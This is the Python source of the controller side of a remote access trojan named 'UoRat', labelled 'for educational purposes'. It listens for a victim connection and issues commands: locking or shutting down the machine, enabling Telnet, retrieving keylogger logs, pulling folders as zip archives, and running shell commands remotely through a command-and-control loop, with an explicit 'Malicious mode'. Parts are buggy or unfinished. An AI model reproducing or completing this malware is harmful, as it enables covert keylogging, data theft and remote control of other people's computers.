"""
+-----------------------------------------------------------------------+
|                               UoRat                                   |
|    Author: 27016005                                                   |
|    Version: 0.3.0                                                     |
|    Last update: 08-04-2021 (dd-mm-yyyy)                               |
|                                                                       |
|                 [   ONLY FOR EDUCATIONAL PURPOSES   ]                 |
+-----------------------------------------------------------------------+
------- CONFIGURATION ------
In order to use this tool you need to do some tweaking:
    1. The Server's IP gets automatically set by taking the address from /etc/hosts (Linux), check if your LAN address exists in this file. I had to put it manually since there was only localhost.
    2. Select a PORT number, the default value set in the client file is 1337
    3. Play around with the paths, I've set some default values but you can change them
------ NOTE ------
This code was tested and developed on a Windows machine, in theory it should work on Linux - it may not work on other machines.
"""

import socket
import sys
import os
import time
import random
import string


class Server:
# '''SOCKET SET UP STARTS HERE'''
    def __init__(self, ip, port, buffer_size):
        self.IP = ip
        self.PORT = port
        #self.BACKUP_PORT = 8080
        self.BUFFER_SIZE = buffer_size
        self.connections = []  # connections list
        self.info = ""  # info about target
        self.recvcounter = 0  # counter for received files
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.Switcher = {
            #"-Host": self.sendHostInfo,
            "-Msg": self.sendMsg,
        #     "-Fsend": self.filesend,
        #     "-RP": self.runprocess,
        #     "-RR": self.runrun,
             "-Telnet": self.enableTN,
             "-Chess": self.playchess,
             "-EpIV": self.playstarwars,
             "-Weather": self.weather,
             "-lock": self.locksystem,
             "-shutdown": self.shutdown,
        #     "-shutdownM": self.shutdownmessage,
        #     "-restart": self.restart,
        #     "-shell": self.fakeshell,
        #     "-loop": self.endless
        }

    def startServer(self):
        self.server.bind((self.IP, self.PORT))
        self.server.listen(2)
        self.acceptConnections()

    def acceptConnections(self):
        print(self.IP)
        print("*** Listening for incoming connections ***")

        self.client_socket, self.address = self.server.accept()
        print(f"*** Connection from {self.address} has been established! ***")
        self.connections.append(self.client_socket)
        # # safemode

        mode = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        print(mode)
        if mode == "2":
            print("Virtuous mode")
            self.connectionconfirm()
        else:
            print("Malicious mode")
        self.commands()
        # # print("hello worlds")

    def generatekey(self):
        # Creates a password containing uppercase, lowercase, numerical digits and punctuation.
        letters = (string.ascii_letters + string.digits + string.punctuation)
        code = ''.join(random.choices(letters, k=10))
        # print("Key =  " + code)
        return code

    def connectionconfirm(self):
        key = self.generatekey()
        print("Key =  " + key)

        self.client_socket.send(key.encode("utf-8"))

        response = self.client_socket.recv(self.BUFFER_SIZE).decode()
        if response == "MISMATCH":
            self.close()

    def closeConnection(self):
        self.connections.remove(self.client_socket)
        self.client_socket.close()
        self.server.close()

    def disconnectTarget(self):
        command = "--esc"

        self.client_socket.send(command.encode("utf-8"))
        print("*** Killed")
# ''' SOCKET SET UP ENDS HERE '''

# ''' COMMAND FUNCTIONS START HERE'''
    '''WINDOWS FUNCTIONS'''
    def sendMsg(self):
        command = "-Msg"
        self.client_socket.send(command.encode())
        msg = input("[+] Enter message: ")
        time.sleep(2)
        self.client_socket.send(msg.encode())
        print(msg)
        results = (self.client_socket.recv(self.BUFFER_SIZE).decode())
        print(results)

    def shutdown(self):
        command = "-shutdown"
        self.client_socket.send(command.encode("utf-8"))

        self.client_socket.close()
        print(f"[!] {self.address[0]} has been Shut Down")

        # locks the user out while keeping connection up

    def locksystem(self):
        command = "-lock"
        self.client_socket.send(command.encode("utf-8"))
        response = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        print(response)

    def restartsystem(self):
        command = "-restart"
        self.client_socket.send(command.encode("utf-8"))
        response = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        print(response)

    ## TODO: CHECK THIS
    def systemmsg(self):
        command = "-Msg"
        self.client_socket.send(command.encode())
        msg = input("[+] Enter message: ")
        time.sleep(2)
        self.client_socket.send(msg.encode())
        print(msg)
        results = (self.client_socket.recv(self.BUFFER_SIZE).decode())
        print(results)

# '''TELNET FUNCTIONS'''
    def playstarwars(self):
        command = "-EpIV"
        self.client_socket.send(command.encode("utf-8"))
        print(f"[!] {self.address[0]} is now watching Star Wars Episode IV:  A New Hope")

    def playchess(self):
        command = "-Chess"
        self.client_socket.send(command.encode("utf-8"))
        print(f"[!] {self.address[0]} is now Playing Chess!! ♜	♞	♝	♛	♚	♝	♞	♜")

    def weather(self):
        command = "-Weather"
        self.client_socket.send(command.encode("utf-8"))
        print(f"[!] {self.address[0]} is checking the weather! ")

    def enableTN(self):
        command = "-Chess"
        self.client_socket.send(command.encode("utf-8"))
        print(f"[!] {self.address[0]} *SHOULD* now have Telnet Client Enabled")

# ''' KEYLOGGER FUNCTIONS '''
    def startKeyLogger(self):
        pass
    def stopKeylogger(self):
        command = "-start"
        self.client_socket.send(command.encode("utf-8"))
        response = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        print(response)

    def stopKeylogger(self):
        command = "-stop"
        self.client_socket.send(command.encode("utf-8"))
        response = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        print(response)

    def retrievelogs(self):

    # """ Receiving the keylogger files """
        command = "--getlogs"
        self.client_socket.send(command.encode("utf-8"))

        flag = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        if flag == "[OK]":
            # recv size
            size = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
            time.sleep(0.1)

            if int(size) <= self.BUFFER_SIZE:
                # recv archive
                archive = self.client_socket.recv(self.BUFFER_SIZE)
                print("*** Got logs ***")

                with open('../receivedfile/keylogs.zip', 'wb+') as output:
                    output.write(archive)

                print("*** Logs saved ***")

            else:
                # update buffer
                buff = self.updateBuffer(size)

                # recv archive
                fullarchive = self.saveBigFile(int(size), buff)

                print("*** Got logs ***")
                with open('../receivedfile/keylogs.zip', 'wb+') as output:
                    output.write(fullarchive)

                print("*** Logs saved ***")
        else:
            print("[!] FATAL: Logs do not exist!")

# ''' SCREENSHOT FUNCTIONS '''

## TODO: Update
    def filesend(self):
        command = "-Fsend"
        self.client_socket.send(command.encode("utf-8"))

        path = input("[+] Enter the file path of the designated folder (NOT A SINGLE FILE): ")
        self.client_socket.send(path.encode("utf-8"))

        response = self.client_socket.recv(self.BUFFER_SIZE)
        if response.decode("utf-8") == "Success":
            size = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
            time.sleep(0.1)
            if int(size) <= self.BUFFER_SIZE:
                # recv archive
                archive = self.client_socket.recv(self.BUFFER_SIZE)
                print("*** Got file ***")

                with open(f'../receivedfile/received{str(self.recvcounter)}.zip', 'wb+') as output:
                    output.write(archive)

                print("*** File saved ***")
                self.recvcounter += 1
            else:
                # update buffer
                buff = self.updateBuffer(size)

                # recv archive
                fullarchive = self.saveBigFile(int(size), buff)

                print("*** Got file *** ")
                with open(f'../receivedfile/received{str(self.recvcounter)}.zip', 'wb+') as output:
                    output.write(fullarchive)

                print("*** File saved ***")
                self.recvcounter += 1
                # recv size
                size = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
                time.sleep(0.1)
                if int(size) <= self.BUFFER_SIZE:
                    # recv archive
                    archive = self.client_socket.recv(self.BUFFER_SIZE)
                    print("*** Got file ***")

                    with open(f'../receivedfile/received{str(self.recvcounter)}.zip', 'wb+') as output:
                        output.write(archive)

                    print("*** File saved ***")
                    self.recvcounter += 1
                else:
                    # update buffer
                    buff = self.updateBuffer(size)

                    # recv archive
                    fullarchive = self.saveBigFile(int(size), buff)

                    print("*** Got file *** ")
                    with open(f'../receivedfile/received{str(self.recvcounter)}.zip', 'wb+') as output:
                        output.write(fullarchive)

                    print("*** File saved ***")
                    self.recvcounter += 1
        else:
            print(response.decode("utf-8"))
    def filereceive(self):
        pass
## TODO: message
    def shutdownmessage(self):
        command = "-shutdownM"
        self.client_socket.send(command.encode("utf-8"))

        self.client_socket.close()
        print(f"[!] {self.address[0]} has been Shut Down")

        # locks the user out while keeping connection up























    def commands(self):
        # os.system("clear")
        while True:
         # get the command from prompt
            command = input("Enter the command you want to execute:")
            # send the command to the client
            print(command)
            # self.client_socket.send(command.encode())

            if command == "exit":
                # if the command is exit, just break out of the loop
                break
            else:
                try:
                    func = self.Switcher.get(command)
                    func()
                except TypeError:
                    print("This operation does not exist. ")
                except ConnectionResetError:
                    """ if the target hard-closes the connection we will receive only a RST packet (TCP), so here we close the connection safely """

                    print("[!] Connection Reset Error")
                    #self.closeConnection()
                except KeyboardInterrupt:
                    print("\n[ STOPPED RECEIVING DATA ]")
                except Exception as e:
                    print("Even I don't know how you got this error - so I'll lock the pc. " + str(e))

        sys.exit()
        # close connection to the client
        self.client_socket.close()
        # close server connection
        self.close()

        print(results)

    def cmdctrl(self):
        """ This is not a real interactive shell, you get the output
        of the command but you can't interact with it """

        print("[!] --back to exit shell")
        while True:
            cmd = input(f"[{self.address[0]}]$ ") # can't .lower() here as sent commands may include uppercase characters

            if not cmd:
                print("[!] Can't send empty command.")
                continue

            if cmd.lower() == "--back":
                print("GO BACK")
                break

            time.sleep(2)
            command = "shell"
            self.client_socket.send(command.encode("utf-8"))
            self.client_socket.send(cmd.encode("utf-8"))

            output = self.client_socket.recv(self.BUFFER_SIZE)

            if not output:
                print("NO OUTPUT")
                input()
                self.connections.remove(self.client_socket)
                self.client_socket.close()
                self.server.close()
                break

            print(output.decode("utf-8"))


def main():
    """ Creating the necessary dirs """

    try:
        os.mkdir('../receivedfile')
    except FileExistsError:
        pass

    # banner()
    time.sleep(1)

    HOSTNAME = socket.gethostname()
    IP = socket.gethostbyname(HOSTNAME)
    PORT = 1337  # int(input("[+] Listen on port> "))
    BUFFERSIZE = 2048

    server = Server(IP, PORT, BUFFERSIZE)

    try:
        server.startServer()
    except Exception as e:
        print("*** Error while starting the server:", str(e) + " ***")
    # just sending a message, for demonstration purposes
    message = "Hello and Welcome".encode()
    # server.client_socket.send(message)


if __name__ == "__main__":
    main()